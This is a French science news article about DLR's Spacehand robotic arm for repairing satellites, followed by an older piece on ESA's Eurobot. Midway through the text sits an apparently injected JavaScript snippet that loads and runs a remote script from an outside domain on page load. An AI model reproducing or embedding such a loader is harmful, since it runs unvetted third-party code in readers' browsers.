{"title": "Spacehand : une main robotique dans l'espace", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-11-09", "content": "Les bras robotiques spatiaux de demain ne seront plus seulement cantonnes a des taches de maintenance ou de recuperation d'echantillons extraterrestres. La Spacehand, du Centre allemand pour l'aeronautique et l'astronautique (DLR), pourra ainsi reparer et construire des satellites. Le point avec Maxime Chalon, responsable du projet. Ce qu'il faut retenir Le Centre allemand pour l'aeronautique et l'astronautique (DLR) a presente la Spacehand, un systeme bras-main anthropomorphe pour assister les astronautes et les decharger de certaines taches.  Cette main robotique est dotee d'une incroyable dexterite et est plus performante que la main humaine.  Cela represente un saut technologique significatif par rapport aux bras robotiques spatiaux en service aujourd'hui. Un bras robotique pour les astronautes                       Avec ses nombreux mouvements possibles, le bras robotique mis au point par DLR pourra effectuer des taches complexes, sur Terre ou dans l'espace. Il se commande par programmation ou bien, comme on le voit ici, en reproduisant les mouvements d'un humain.                                       Aujourd'hui, les agences spatiales travaillent sur des concepts de bras-mains anthropomorphes avec des capacites superieures a celles des mains humaines. Un de ces projets est sur le point d'aboutir. En effet, il y a quelques semaines, le Centre allemand pour l'aeronautique et l'astronautique (DLR) a profite du salon professionnel dedie aux technologies spatiales,  Space Tech Expo & Conference , pour presenter un <<  systeme de bras-main anthropomorphe extremement robuste, developpe au centre de  robotique  et de mecatronique de DLR  >>, nous explique Maxime Chalon, responsable du  projet Spacehand  au DLR.  Ce systeme robotique est developpe dans le cadre de la mission RSGS ( Robotic Servicing of Geosynchronous Satellites ), de la Darpa (ce satellite, dont le lancement est prevu au debut des annees 2020, doit <<  demontrer sa capacite a ravitailler et reparer un satellite en orbite geostationnaire  >>). Il prefigure de futurs services aux satellites en orbite lies a la maintenance, comme le  ravitaillement en ergols , la reparation des incidents mecaniques, l'installation de charge utile additionnelle et la possibilite d'ameliorer des fonctions existantes. Au premier coup d'oeil, il est possible de s'apercevoir de la complexite du systeme. Avec  << plus de 7 + 12 moteurs et 100 capteurs, il est capable d'une tres grande dexterite et d'interagir avec douceur >> . Un nombre aussi important de capteurs peut surprendre mais c'est une necessite pour <<  intervenir sur des satellites dont les structures et les equipements sont tres fragiles  >>.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Un maximum de liberte Ce systeme a, dans chacun de ses axes,  << des moteurs avec des capteurs de couple qui font que le bras se comporte comme un ressort virtuel  >>. Concretement, il est possible, <<  tout comme peut le faire l'etre humain  >>, d'ajuster la rigidite des <<  doigts afin de s'adapter au mieux aux taches a effectuer  >>. Chacune des articulations a ses propres capteurs de couple, qui vont <<  permettre a la main de se comporter doucement  >>. Concretement, avec ces capteurs, si un operateur demande a la main de serrer un objet,  << elle pourra le faire et s'arretera si l'effort est suffisant  >>. Autre exemple : si, par erreur, on lui demande d'aller au niveau de quelque chose, elle va <<  simplement s'appuyer contre et s'arreter afin de ne pas endommager ce qui est touche  >>. La forme tarabiscotee du bras s'explique par le besoin <<  d'avoir un maximum de degre de liberte  >>. Avec 7deg de liberte (12deg pour la main), ce bras a la liberte de mouvement qui lui permet de se <<  placer librement dans son environnement et de tourner autour d'un point  >>. Avec un degre de mouvement moindre, le bras aurait eu des <<  difficultes pour acceder a tous les endroits qui l'entourent  >>. Cette forme a aussi ete pensee pour eviter que <<  les utilisateurs du bras se coincent ou se coupent des doigts  >>. A gauche, la Spacehand du DLR, et, a droite, Dextre, de l'Agence spatiale canadienne, installe sur l'ISS. Plusieurs decennies separent ces deux bras. (c) Remy Decourt et Nasa                               Changement d'epoque par rapport au bras de l'ISS Pour operer avec ce systeme de bras-main anthropomorphe, <<  deux options sont possibles en fonction des communications  >> : Avec un lien direct, le temps de latence est tres reduit et <<  nous permet de telemanipuler  >> la Spacehand. Cela ne sera pas possible si le <<  lien avec le sol et le systeme n'est pas direct  >>. Dans ce cas, la Spacehand pourra fonctionner avec une certaine autonomie. Ce systeme offre <<  plus de dexterite que le bras robotique Canadarm 2, de la  Station spatiale internationale  ( ISS )  >>. Canadarm 2 a surtout ete concu pour l'assemblage et l'entretien de l'ISS. Il est essentiellement utilise pour le deplacement et le port de charges lourdes comme des equipements, des instruments et des modules. Il n'est donc pas concu pour interagir avec la Station comme pourrait le faire la Spacehand.  Dextre , le manipulateur agile specialise du bras et de conception plus recente que le Canadarm 2, s'approche du concept mais ses <<  capacites d'interaction avec le complexe orbital sont tres en deca de notre Spacehand  >>, qui pousse le concept au <<  maximum de l'etat de l'art de nos connaissances  >>, estime Maxime Chalon. Au-dela de cette mission de demonstration, ce systeme bras-main anthropomorphe pourra etre adapte a d'autres utilisations spatiales. On pense aux activites humaines en orbite basse ou dans l' espace profond , de facon a restreindre les sorties des  astronautes . La Spacehand pourra etre utilisee pour <<  realiser tout un tas de taches qui ne necessitent pas vraiment d'humains, comme, par exemple, retirer et remplacer des couvertures thermiques  >>. Pour en savoir plus Le robot dansant de l'Agence spatiale europeenne Article de Remy Decourt publie le 08/03/2011 Il fallait bien un  robot  danseur pour ce Mois de la robotique, et celui-la, baptise Eurobot, a ete imagine pour se promener dans le vide de l'espace... En 2007, l' Agence spatiale europeenne  et Thales Alenia Space cherchaient a mettre au point une sorte d'assistance robotique aux sorties extravehiculaires des astronautes humains. Le projet n'a pas abouti mais se poursuit sous d'autres formes, pour des missions sans hommes. Dans la course a la  robotique , l'Esa n'est pas en reste.  Eurobot , c'est son nom, est un programme lance en 2002 qui avait pour objectif de demontrer la faisabilite d'un assistant robotique pour appuyer les astronautes pendant leurs sorties extravehiculaires (EVA). Ce programme avait debouche sur un demonstrateur attestant ses capacites lors d'une serie d'essais et de tests simulant des sorties dans l'espace, a l'exterieur de l'ISS.  Ce systeme robotique etait constitue de trois bras et d'une structure, l' exosquelette , qui devait permettre aux astronautes de le commander en recourant aux techniques de la  realite virtuelle . Ces bras etaient concus autant pour se deplacer que pour des taches variees : debarrasser les astronautes de leurs outils, ouvrir et fermer des caisses, se charger du rangement a l'issue de l'EVA et remettre a leur place les objets utilises. Beneficiant d'une tres grande autonomie et dote de performances remarquables, ce robot ne pouvait cependant realiser que ce qu'il avait appris a faire. Apres les bras telemanipulateurs de la Station (Canadarm2, celui de Kibo, le futur bras europeen Era), Eurobot est une des etapes menant a la mise au point d'une intelligence artificielle. (c) H. Rub, ESA                               Bien qu'il ressemble aux bras robotiques en service aujourd'hui sur l'ISS, qu'il serait plus judicieux d'appeler telemanipulateur, son concept est tres different.  Canadarm2  comme le bras du Japon ont l'inconvenient d'etre fixes et de se deplacer seulement d'un point fixe a un autre.  Eurobot , lui, a ete concu pour s'affranchir de cette contrainte de facon a de se deplacer sur toute la surface exterieure de la Station en s'agrippant a des mains courantes, que l'on trouve en grand nombre sur les modules de l'ISS. Un centaure europeen pour l'espace Malgre des tests reussis en piscine, ce  robot  ne sera jamais utilise sur la Station. Cependant, le travail realise n'est pas pour autant perdu. En 2008, l'Esa a engage une nouvelle phase du programme en financant le projet d'assistant robotique de surface EGP ( Eurobot Ground Prototype ).  Cette fois, l'idee est d'etendre les capacites des  robots  au-dela de leur utilisation sur la Station dans le cadre de possibles scenarios d'exploration du  Systeme solaire  par des missions habitees. Le nouveau systeme robotique est concu pour etre exploite a la surface d'une planete, pour preparer l'atterrissage des astronautes puis pour soutenir leurs activites apres leur debarquement. ", "theme": "sciences"}